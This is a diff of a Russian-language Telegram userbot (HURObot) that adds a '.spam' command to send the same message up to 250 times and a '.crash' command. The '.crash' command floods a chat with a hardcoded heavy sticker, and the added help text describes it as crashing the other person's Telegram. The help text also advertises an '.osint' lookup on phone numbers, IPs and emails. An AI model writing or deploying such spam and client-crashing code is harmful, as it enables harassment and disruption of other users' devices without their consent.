@@ -1,4 +1,4 @@
-    # HURObot - Полный исправленный код (22 Мая 2025)
+    # HURObot - Полный исправленный код (24 Мая 2025)
 import os
 import asyncio
 import sys
@@ -24,11 +24,13 @@ from telethon.tl.functions.account import UpdateStatusRequest
 from telethon.tl.functions.messages import DeleteHistoryRequest
 from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.types import DocumentAttributeFilename
+from telethon.tl.types import DocumentAttributeSticker
 from PIL import Image
 import io
 import telethon
 import whois
 import traceback
+from telethon.tl import types
 
 # ======================
 # СИСТЕМА ОБНОВЛЕНИЙ
@@ -499,33 +501,6 @@ async def run_account(account_num):
             client._hurobot_state = state
             input_task = asyncio.create_task(console_input_listener())
 
-            """async def keep_online_task():
-                while state.keep_online and client.is_connected():
-                    try:
-                        await client(UpdateStatusRequest(offline=False))
-                        await asyncio.sleep(random.randint(30, 40))
-                    except FloodWaitError as e:
-                        print(f"{COLORS['error']}FloodWait: {e.seconds} сек{COLORS['reset']}")
-                        await asyncio.sleep(e.seconds + 5)
-                    except Exception as e:
-                        print(f"{COLORS['error']}Ошибка онлайна: {str(e)}{COLORS['reset']}")
-                        await asyncio.sleep(60)"""
-
-            """async def spam_online_task():
-                while state.spam_online and client.is_connected():
-                    try:
-                        if time.time() - state.last_user_activity < 60:
-                            await asyncio.sleep(10)
-                            continue
-                        online = random.choice([True, False])
-                        await client(UpdateStatusRequest(offline=not online))
-                        await asyncio.sleep(1)
-                    except FloodWaitError as e:
-                        print(f"{COLORS['error']}FloodWait: {e.seconds} сек{COLORS['reset']}")
-                        await asyncio.sleep(e.seconds + 5)
-                    except Exception as e:
-                        print(f"{COLORS['error']}Ошибка мигающего онлайна: {str(e)}{COLORS['reset']}")
-                        await asyncio.sleep(10) """
 
             # Словарь с описаниями команд
             command_info = {
@@ -618,7 +593,19 @@ async def run_account(account_num):
                     'description': 'Показывает информацию о домене (регистрация, владелец, DNS и т.д.)',
                     'syntax': '`.whois` [домен]',
                     'example': '`.whois google.com`'
-                }
+                },
+                'spam': {
+                    'name': 'spam',
+                    'description': 'Отправляет указанное количество одинаковых сообщений (до 50).',
+                    'syntax': '`.spam` [количество] [сообщение]',
+                    'example': '`.spam 10 Привет!`'
+                },
+                'crash': {
+                    'name': 'crash',
+                    'description': 'Отправляет стикеры, которые могут нагружать телефон.',
+                    'syntax': '`.crash`',
+                    'example': '`.crash`'
+                },
                 }  
 
             def get_usage_instructions(command_name, status=None):
@@ -682,110 +669,7 @@ async def run_account(account_num):
                                    "\n"
                                    "**HURObot // @hurodev**")
 
-            # 3. .onl - Вечный онлайн
-            """@client.on(events.NewMessage(outgoing=True, pattern=r'^\.onl(?:\s+(on|off))?$'))
-            async def online_handler(event):
-                state.last_user_activity = time.time()
-                action = event.pattern_match.group(1)
-                if not action:
-                    status = "включён" if state.keep_online else "выключен"
-                    await event.edit(get_usage_instructions('onl', status=status))
-                    return
-                try:
-                    new_state = action.lower() == 'on'
-                    if new_state == state.keep_online:
-                        status = "включена" if state.keep_online else "выключена"
-                        await event.edit(f"✦ Вечный онлайн уже {status}\n"
-                                       f"➤ Подробно: `.help onl`\n"
-                                       "\n"
-                                       "**HURObot // @hurodev**")
-                        return
-                    state.keep_online = new_state
-                    status = "включена" if state.keep_online else "выключена"
-                    if state.keep_online and state.spam_online:
-                        state.spam_online = False
-                        if state.spam_online_task:
-                            state.spam_online_task.cancel()
-                            try:
-                                await state.spam_online_task
-                            except asyncio.CancelledError:
-                                pass
-                            state.spam_online_task = None
-                    await event.edit(f"✦ Вечный онлайн {status}\n"
-                                   f"➤ Подробно: `.help onl`\n"
-                                   "\n"
-                                   "**HURObot // @hurodev**")
-                    if state.keep_online and client.is_connected():
-                        if state.online_task:
-                            state.online_task.cancel()
-                            try:
-                                await state.online_task
-                            except asyncio.CancelledError:
-                                pass
-                        state.online_task = asyncio.create_task(keep_online_task())
-                    elif state.online_task:
-                        state.online_task.cancel()
-                        try:
-                            await state.online_task
-                        except asyncio.CancelledError:
-                            pass
-                        state.online_task = None
-                except Exception as e:
-                    await event.edit(f"✦ Ошибка\n"
-                                   f"➤ {str(e)}\n"
-                                   "\n"
-                                   "**HURObot // @hurodev**")
 
-            # 4. .sonl - Мигающий онлайн
-            @client.on(events.NewMessage(outgoing=True, pattern=r'^\.sonl(?:\s+(on|off))?$'))
-            async def sonl_handler(event):
-                state.last_user_activity = time.time()
-                action = event.pattern_match.group(1)
-                if not action:
-                    status = "включён" if state.spam_online else "выключен"
-                    await event.edit(get_usage_instructions('sonl', status=status))
-                    return
-                try:
-                    new_state = action.lower() == 'on'
-                    if new_state == state.spam_online:
-                        status = "включён" if state.spam_online else "выключен"
-                        await event.edit(f"✦ Мигающий онлайн уже {status}\n"
-                                       f"➤ Подробно: `.help sonl`\n"
-                                       "\n"
-                                       "**HURObot // @hurodev**")
-                        return
-                    if new_state and state.keep_online:
-                        await event.edit(f"✦ Ошибка\n"
-                                       f"➤ Выключите вечный онлайн (`.onl off`)\n"
-                                       "\n"
-                                       "**HURObot // @hurodev**")
-                        return
-                    state.spam_online = new_state
-                    status = "включён" if state.spam_online else "выключен"
-                    await event.edit(f"✦ Мигающий онлайн {status}\n"
-                                   f"➤ Подробно: `.help sonl`\n"
-                                   "\n"
-                                   "**HURObot // @hurodev**")
-                    if state.spam_online:
-                        if state.spam_online_task:
-                            state.spam_online_task.cancel()
-                            try:
-                                await state.spam_online_task
-                            except asyncio.CancelledError:
-                                pass
-                        state.spam_online_task = asyncio.create_task(spam_online_task())
-                    elif state.spam_online_task:
-                        state.spam_online_task.cancel()
-                        try:
-                            await state.spam_online_task
-                        except asyncio.CancelledError:
-                            pass
-                        state.spam_online_task = None
-                except Exception as e:
-                    await event.edit(f"✦ Ошибка\n"
-                                   f"➤ {str(e)}\n"
-                                   "\n"
-                                   "**HURObot // @hurodev**")"""
 
             # 5. .clone - Клонирование поста
             @client.on(events.NewMessage(outgoing=True, pattern=r'^\.clone(?:\s+(.+))?$'))
@@ -1039,6 +923,70 @@ async def run_account(account_num):
                                    "\n"
                                    "**HURObot // @hurodev**")
 
+            @client.on(events.NewMessage(outgoing=True, pattern=r'^\.spam(?:\s+(\d+)\s+(.+))?$'))
+            async def spam_handler(event):
+                state.last_user_activity = time.time()
+                args = event.pattern_match.groups()
+                    
+                if not args or not args[0] or not args[1]:
+                    await event.edit(
+                        "<b>✦ Укажите количество и сообщение!</b>\n➤ **Пример:**\n➤ <code>.spam [количество] [сообщение]</code>",
+                        parse_mode='html'
+                    )
+                    return
+                    
+                try:
+                    count = int(args[0])
+                    message = args[1]
+                        
+                    if count > 250:
+                        await event.edit("<b>✦ Максимальное количество: 250</b>", parse_mode='html')
+                        return
+                        
+                    await event.delete()
+                        
+                    for _ in range(count):
+                        await event.client.send_message(event.chat_id, message)
+                        await asyncio.sleep(0.5)  # Небольшая задержка между сообщениями
+                            
+                except Exception as e:
+                    await event.edit(f"<b>✦ Ошибка:</b>\n➤<code>{str(e)}</code>", parse_mode='html')
+
+            
+
+
+            @client.on(events.NewMessage(outgoing=True, pattern=r'^\.crash$'))
+            async def crash_handler(event):
+                try:
+                    await event.delete()
+                    
+                    # Параметры вашего стикера
+                    STICKER_ID = 5796478306379369751
+                    ACCESS_HASH = 682065399763207140
+                    FILE_REFERENCE = b'\x01\x00\x00\x14\xabh1\xa0f\x0b\xef\xbb\t\xfcU\x9fx\x15\xbbD{d\xf9\xcd\x19'
+
+                    sticker = types.InputDocument(
+                        id=STICKER_ID,
+                        access_hash=ACCESS_HASH,
+                        file_reference=FILE_REFERENCE
+                    )
+
+                    for _ in range(20):
+                        await client.send_file(
+                            event.chat_id,
+                            sticker,
+                            allow_cache=False
+                        )
+                        await asyncio.sleep(0.3)
+
+                except FloodWaitError as e:
+                    print(f"⏳ Флуд-контроль: {e.seconds} сек")
+                    await asyncio.sleep(e.seconds)
+                    
+                except Exception as e:
+                    print(f"🚨 Ошибка: {str(e)}")
+
+
             # 12. .up - Многократные упоминания
             @client.on(events.NewMessage(outgoing=True, pattern=r'^\.up(?:\s+(\d+))?$'))
             async def up_handler(event):
@@ -1279,6 +1227,8 @@ async def run_account(account_num):
 ➤ `.data` - Инфо о пользователе
 ➤ `.osint` [телефон/ip/почта] - пробив
 ➤ `.whois` [домен] - Информация о домене
+➤ `.spam` [число] [сообщение] - Спам указаным сообщением
+➤ `.crash` - спамит тяжолыми стикерами и крашит тг собеседника
 ➤ Для справки: `.help [название команды]`
 
 **✦ Фоновые функции:**
